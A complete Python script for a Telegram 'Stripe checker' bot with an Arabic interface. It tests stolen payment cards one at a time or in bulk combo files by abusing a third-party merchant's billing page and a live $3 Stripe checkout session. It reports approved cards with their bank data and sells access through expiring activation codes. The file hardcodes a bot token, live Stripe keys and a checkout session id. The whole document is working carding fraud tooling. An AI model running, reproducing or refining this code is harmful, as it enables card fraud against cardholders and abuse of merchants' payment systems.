#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import time
import requests
import uuid
import threading
import hashlib
import random
from datetime import datetime
from telebot import TeleBot, types
from dotenv import load_dotenv

# =============== تحميل متغيرات البيئة ===============
load_dotenv()

# قراءة التوكن والأدمن من البيئة أو القيم الافتراضية
BOT_TOKEN = os.getenv("BOT_TOKEN", "8945342093:AAH7rQ2-3z5gri7zhxvPdxYpK26LCppMLKE")

admin_env = os.getenv("ADMINS", "8855682617,8011795436")
ADMINS = [int(i.strip()) for i in admin_env.split(",") if i.strip()]

DEV = "@N_0_130"
AUTHOR = "@N_0_130"
VERSION = "v6.0"

# =============== نظام المستخدمين والكودات ===============
AUTHORIZED_USERS = list(ADMINS)
user_codes = {}
pending_codes = {}
stop_flags = {}

# =============== قائمة البوابات Dynamic Gateways ===============
GATEWAYS = [
    {
        "name": "Stripe Auth (ProxyWing)",
        "type": "auth",
        "stripe_key": "pk_live_51NxTgeFZsEVAL3ZKnbjGrz8S0xO6fhPvT4bt4aeooxVpo5Scvr9sBQQ24ROaDcQGBavclQgqnrNPJOuqY4rlW5ji000xb2zNt3",
        "url": "https://dashboard.proxywing.com",
        "active": True,
        "last_error": None
    },
    {
        "name": "Stripe $3 Checkout",
        "type": "3d",
        "stripe_key": "pk_live_51GjnvOEtynl19Eg2AOFRLLS54B2hzHZvHVgadRoeO1hZsMbvhZ54lzfRQsLVzXB7rvCeB1l7plSXA3mVqQJa1L1P008HUtbtyF",
        "checkout_session": "cs_live_a1eI6jVt4AWmA84VofiO8deHZXFDRWOmUuVt6m22Z96nFd2sNpjsMcLYBF",
        "checkout_config": "873ff754-640d-4ba1-8f89-0659fe6abdfc",
        "active": True,
        "last_error": None
    }
]

bot = TeleBot(BOT_TOKEN, parse_mode='HTML')
selected_gateway_index = 0
temp_files = {}

# =============== دوال التوثيق والصلاحيات ===============
def is_authorized(user_id):
    if user_id in ADMINS:
        return True
    if user_id in user_codes:
        if user_codes[user_id]['expiry'] > time.time():
            return True
        else:
            del user_codes[user_id]
    return False

def generate_user_code(expiry_days):
    code = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]
    pending_codes[code] = {
        'expiry': time.time() + (expiry_days * 86400),
        'created_by': ADMINS[0] if ADMINS else 0
    }
    return code

def activate_user_code(user_id, code):
    if code in pending_codes:
        data = pending_codes[code]
        user_codes[user_id] = {'expiry': data['expiry']}
        del pending_codes[code]
        return True
    return False

def get_user_expiry(user_id):
    if user_id in user_codes:
        expiry = user_codes[user_id]['expiry']
        return datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
    return "غير مسجل"

# =============== دوال إنشاء الجلسات وفحص البطاقات ===============
def create_fresh_setup_intent(gateway):
    session = requests.Session()
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    try:
        url = f"{gateway['url']}/billing/account/paymentmethods/add"
        response = session.get(url, headers=headers, timeout=15)
        if response.status_code != 200:
            return None
        
        html = response.text
        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
        token = token_match.group(1) if token_match else None
        if not token:
            return None
        
        cs_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        client_session_id = cs_match.group(1) if cs_match else str(uuid.uuid4())
        
        wc_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        wallet_config_id = wc_match.group(1) if wc_match else "2c10bacc-6fe0-42ea-a155-111bdb9d9751"
        
        stripe_mid, stripe_sid = str(uuid.uuid4()), str(uuid.uuid4())
        for cookie in session.cookies:
            if cookie.name == '__stripe_mid': stripe_mid = cookie.value
            if cookie.name == '__stripe_sid': stripe_sid = cookie.value
        
        headers2 = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = f'token={token}&type=token_stripe&billingcontact=0'
        url2 = f"{gateway['url']}/billing/index.php?rp=/stripe/setup/intent"
        
        response2 = session.post(url2, headers=headers2, data=data, timeout=15)
        result = response2.json()
        
        if 'setup_intent' in result:
            full = result['setup_intent']
            return {
                'id': full.split('_secret')[0],
                'secret': full,
                'client_session_id': client_session_id,
                'wallet_config_id': wallet_config_id,
                'stripe_mid': stripe_mid,
                'stripe_sid': stripe_sid,
            }
        return None
    except Exception as e:
        return None

def check_card_auth(card_line, gateway):
    intent_data = create_fresh_setup_intent(gateway)
    if not intent_data:
        return "❌ Intent Creation Failed"
    
    try:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4: yy = yy[-2:]
        
        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        data = f'payment_method_data[type]=card&payment_method_data[card][number]={formatted_cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm.zfill(2)}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538&payment_method_data[muid]={intent_data["stripe_mid"]}&payment_method_data[sid]={intent_data["stripe_sid"]}&payment_method_data[payment_user_agent]=stripe.js%2Ff93cb2e34f&payment_method_data[referrer]={gateway["url"]}&payment_method_data[client_attribution_metadata][client_session_id]={intent_data["client_session_id"]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][wallet_config_id]={intent_data["wallet_config_id"]}&expected_payment_method_type=card&use_stripe_sdk=true&key={gateway["stripe_key"]}&client_secret={intent_data["secret"]}'
        
        url = f"https://api.stripe.com/v1/setup_intents/{intent_data['id']}/confirm"
        response = requests.post(url, headers=headers, data=data, timeout=15)
        result = response.json()
        
        if result.get('status') == 'succeeded':
            return "✅ APPROVED"
        elif 'error' in result:
            err = result['error'].get('decline_code') or result['error'].get('message', '')
            return f"❌ DECLINED [{err[:30]}]"
        return "❌ DECLINED"
    except Exception as e:
        return f"❌ ERROR [{str(e)[:20]}]"

def check_card_3d(card_line, gateway):
    try:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4: yy = yy[-2:]
        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
        
        data = f'type=card&card[number]={formatted_cc}&card[cvc]={cvv}&card[exp_month]={mm.zfill(2)}&card[exp_year]={yy}&billing_details[name]=Devx+devx&key={gateway["stripe_key"]}'
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
        pm_result = response.json()
        
        if 'id' not in pm_result:
            return "❌ DECLINED [Invalid Card]"
        
        pm_id = pm_result['id']
        cs_id = gateway["checkout_session"]
        
        data2 = f'eid=NA&payment_method={pm_id}&expected_amount=300&expected_payment_method_type=card&key={gateway["stripe_key"]}'
        response2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{cs_id}/confirm', headers=headers, data=data2, timeout=15)
        result = response2.json()
        
        if result.get('payment_intent', {}).get('status') == 'succeeded':
            return "✅ APPROVED"
        else:
            return "❌ DECLINED"
    except Exception as e:
        return f"❌ ERROR [{str(e)[:20]}]"

def get_bin_info(bin_num):
    try:
        r = requests.get(f'https://lookup.binlist.net/{bin_num}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                'bank': d.get('bank', {}).get('name', 'Unknown'),
                'country': d.get('country', {}).get('name', 'Unknown'),
                'emoji': d.get('country', {}).get('emoji', '🌍'),
                'scheme': d.get('scheme', 'Unknown'),
                'type': d.get('type', 'Unknown'),
            }
    except:
        pass
    return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '🌍', 'scheme': 'Unknown', 'type': 'Unknown'}

def extract_cards(content):
    cards = []
    for line in content.split('\n'):
        line = line.strip()
        if line and '|' in line:
            parts = line.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                if len(yy) == 4: yy = yy[-2:]
                cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards

# =============== الأوامر واللوحات ===============
@bot.message_handler(commands=["start"])
def start_command(message):
    user_id = message.chat.id
    if user_id in ADMINS:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔐 إنتاج كود جديد", callback_data="create_code"),
            types.InlineKeyboardButton("📊 الكودات النشطة", callback_data="list_codes"),
            types.InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="list_users")
        )
        bot.reply_to(message, f"""
✅ <b>لوحة تحكم البوت (Stripe Multi-Gateway)</b>
━━━━━━━━━━━━━━━━━━━━━
👑 <b>أهلاً بك يا أدمن</b>
━━━━━━━━━━━━━━━━━━━━━
📌 <b>الأوامر المتاحة:</b>
/chk CC|MM|YY|CVV - فحص بطاقة
/combo - فحص ملف كومبو
/gateway - تغيير البوابة المحددة
/status - حالة البوابات
/gencode days - إنشاء كود للمستخدمين
/activate code - تفعيل كود
━━━━━━━━━━━━━━━━━━━━━
{VERSION} | {DEV}
""", parse_mode='HTML', reply_markup=markup)
    elif is_authorized(user_id):
        expiry = get_user_expiry(user_id)
        bot.reply_to(message, f"""
✅ <b>مرحباً بك في بوت الفحص</b>
━━━━━━━━━━━━━━━━━━━━━
📅 تاريخ الانتهاء: {expiry}
━━━━━━━━━━━━━━━━━━━━━
📌 <b>الأوامر:</b>
/chk CC|MM|YY|CVV
/combo - رفع ملف كومبو
/gateway - اختيار البوابة
━━━━━━━━━━━━━━━━━━━━━
{VERSION} | {DEV}
""", parse_mode='HTML')
    else:
        bot.reply_to(message, f"❌ <b>غير مصرح لك بالسماح!</b>\nيرجى التواصل مع {DEV} للحصول على كود التفعيل.", parse_mode='HTML')

@bot.message_handler(commands=["activate"])
def activate(message):
    user_id = message.chat.id
    code = message.text.replace('/activate ', '').strip()
    if activate_user_code(user_id, code):
        bot.reply_to(message, "✅ <b>تم تفعيل الكود بنجاح!</b>\nيمكنك الآن إرسال الأوامر واستخدام البوت.", parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ <b>الكود غير صالح أو تم استخدامه سابقاً!</b>", parse_mode='HTML')

@bot.message_handler(commands=["gencode"])
def gen_code(message):
    user_id = message.chat.id
    if user_id not in ADMINS:
        bot.reply_to(message, "❌ هذا الأمر للأدمن فقط")
        return
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ الصيغة: /gencode <عدد الأيام>", parse_mode='HTML')
            return
        days = int(parts[1])
        code = generate_user_code(days)
        bot.reply_to(message, f"✅ <b>تم إنشاء الكود:</b>\n<code>{code}</code>\nالصلاحية: {days} يوم\nللتفعيل: <code>/activate {code}</code>", parse_mode='HTML')
    except ValueError:
        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح للأيام", parse_mode='HTML')

@bot.message_handler(commands=["gateway"])
def gateway_command(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ غير مصرح")
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, g in enumerate(GATEWAYS):
        marker = "👉 " if i == selected_gateway_index else ""
        markup.add(types.InlineKeyboardButton(f"{marker}{g['name']} ({g['type'].upper()})", callback_data=f"gateway_{i}"))
    bot.reply_to(message, "🔐 <b>اختر البوابة المطلوبة للفحص:</b>", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gateway_"))
def gateway_callback(call):
    global selected_gateway_index
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ غير مصرح")
        return
    idx = int(call.data.split("_")[1])
    selected_gateway_index = idx
    bot.answer_callback_query(call.id, f"✅ تم اختيار {GATEWAYS[idx]['name']}")
    bot.edit_message_text(f"✅ البوابة الحالية: <b>{GATEWAYS[idx]['name']}</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')

@bot.message_handler(commands=["chk"])
def check_command(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ غير مصرح لك! استخدم /activate <الكود>", parse_mode='HTML')
        return
    
    try:
        card = message.text.replace('/chk ', '').strip()
        parts = card.split('|')
        if len(parts) < 4:
            bot.reply_to(message, "❌ صيغة غير صحيحة!\nالتنسيق: <code>/chk CC|MM|YY|CVV</code>", parse_mode='HTML')
            return
        
        status_msg = bot.reply_to(message, "⌛ جاري الفحص...")
        gateway = GATEWAYS[selected_gateway_index]
        
        if gateway["type"] == "auth":
            result = check_card_auth(card, gateway)
        else:
            result = check_card_3d(card, gateway)
            
        bin_info = get_bin_info(parts[0][:6])
        
        res_text = f"""
◈ <b>RESULT CHECKER</b> ◈
━━━━━━━━━━━━━━━━━━━━━
💳 <b>CC:</b> <code>{card}</code>
📌 <b>Status:</b> {result}
🔐 <b>Gateway:</b> {gateway['name']}
━━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bank:</b> {bin_info['bank']}
🌍 <b>Country:</b> {bin_info['emoji']} {bin_info['country']}
💳 <b>Type:</b> {bin_info['scheme']} - {bin_info['type']}
━━━━━━━━━━━━━━━━━━━━━
⚡ {DEV}
"""
        bot.edit_message_text(res_text, message.chat.id, status_msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)[:100]}")

@bot.message_handler(commands=["combo"])
def combo_command(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ غير مصرح")
        return
    bot.reply_to(message, "📂 أرسل ملف نصي <b>.txt</b> يحتوي على الكومبو للفحص المجمع.", parse_mode='HTML')

@bot.message_handler(content_types=["document"])
def handle_combo_file(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ غير مصرح")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8')
        
        cards = extract_cards(content)
        if not cards:
            bot.reply_to(message, "❌ لم يتم العثور على بطاقات صالحة في الملف")
            return
        
        total = len(cards)
        file_id = str(message.message_id)
        temp_files[file_id] = {'cards': cards, 'total': total}
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        for i, g in enumerate(GATEWAYS):
            markup.add(types.InlineKeyboardButton(f"فحص على {g['name']}", callback_data=f"combo_gw_{i}_{file_id}"))
        
        bot.reply_to(message, f"📁 <b>تم تحميل الملف!</b>\nإجمالي البطاقات: {total}\nاختر البوابة للبدء:", parse_mode='HTML', reply_markup=markup)
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في القراءة: {str(e)[:100]}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("combo_gw_"))
def start_combo_check(call):
    user_id = call.from_user.id
    if not is_authorized(user_id): return
    
    parts = call.data.split("_")
    idx = int(parts[2])
    file_id = parts[3]
    
    if file_id not in temp_files:
        bot.answer_callback_query(call.id, "❌ الملف انتهت صلاحيته")
        return
    
    cards = temp_files[file_id]['cards']
    total = len(cards)
    gateway = GATEWAYS[idx]
    
    stop_flags[user_id] = False
    bot.answer_callback_query(call.id, f"🚀 بدء الفحص على {gateway['name']}")
    
    status_msg = bot.edit_message_text(f"🔍 جاري الفحص... [0/{total}]", call.message.chat.id, call.message.message_id)
    
    approved = 0
    declined = 0
    
    for i, card in enumerate(cards, 1):
        if stop_flags.get(user_id, False):
            bot.send_message(call.message.chat.id, "⏹️ تم إيقاف عملية الفحص بطلب منك.")
            break
            
        if gateway["type"] == "auth":
            res = check_card_auth(card, gateway)
        else:
            res = check_card_3d(card, gateway)
            
        if "APPROVED" in res:
            approved += 1
            bin_info = get_bin_info(card.split('|')[0][:6])
            bot.send_message(call.message.chat.id, f"✅ <b>APPROVED CARD!</b>\n💳 <code>{card}</code>\n🔐 Gateway: {gateway['name']}\n🏦 {bin_info['bank']} | {bin_info['country']}", parse_mode='HTML')
        else:
            declined += 1
            
        if i % 3 == 0 or i == total:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data=f"stop_{user_id}"))
            try:
                bot.edit_message_text(f"🔍 <b>فحص جارٍ...</b>\n البوابة: {gateway['name']}\n📊 التقدم: [{i}/{total}]\n✅ المقبولة: {approved}\n❌ المرفوضة: {declined}", call.message.chat.id, status_msg.message_id, parse_mode='HTML', reply_markup=markup)
            except: pass
        time.sleep(0.5)
        
    del temp_files[file_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_combo(call):
    uid = int(call.data.split("_")[1])
    stop_flags[uid] = True
    bot.answer_callback_query(call.id, "⏹️ تم إرسال أمر الإيقاف")

# =============== الكولباك الإضافي للأدمن ===============
@bot.callback_query_handler(func=lambda call: call.data == 'create_code')
def create_code_cb(call):
    if call.from_user.id not in ADMINS: return
    msg = bot.send_message(call.from_user.id, "📝 أدخل عدد أيام الصلاحية الكود (مثال 30):")
    bot.register_next_step_handler(msg, process_code_days)

def process_code_days(message):
    try:
        days = int(message.text.strip())
        code = generate_user_code(days)
        bot.send_message(message.chat.id, f"✅ <b>تم إنشاء الكود:</b>\n<code>{code}</code>\nالصلاحية: {days} يوم", parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, "❌ رقم غير صحيح")

@bot.callback_query_handler(func=lambda call: call.data == 'list_codes')
def list_codes_cb(call):
    if call.from_user.id not in ADMINS: return
    if not pending_codes:
        bot.send_message(call.from_user.id, "📭 لا توجد كودات نشطة حالياً.")
        return
    msg = "📋 <b>الكودات النشطة:</b>\n"
    for code, d in pending_codes.items():
        exp = datetime.fromtimestamp(d['expiry']).strftime('%Y-%m-%d %H:%M')
        msg += f"🔑 <code>{code}</code> | ينتهي: {exp}\n"
    bot.send_message(call.from_user.id, msg, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'list_users')
def list_users_cb(call):
    if call.from_user.id not in ADMINS: return
    if not user_codes:
        bot.send_message(call.from_user.id, "📭 لا يوجد مستخدمين نشطين.")
        return
    msg = "👥 <b>المستخدمين المفعلين:</b>\n"
    for uid, d in user_codes.items():
        exp = datetime.fromtimestamp(d['expiry']).strftime('%Y-%m-%d %H:%M')
        msg += f"🆔 <code>{uid}</code> | ينتهي: {exp}\n"
    bot.send_message(call.from_user.id, msg, parse_mode='HTML')

# =============== تشغيل البوت ===============
if __name__ == "__main__":
    print("=" * 50)
    print("✅ STARTING STRIPE CHECKER BOT")
    print(f"👥 Admins: {ADMINS}")
    print(f"🔐 Gateways Count: {len(GATEWAYS)}")
    print("=" * 50)
    bot.infinity_polling()
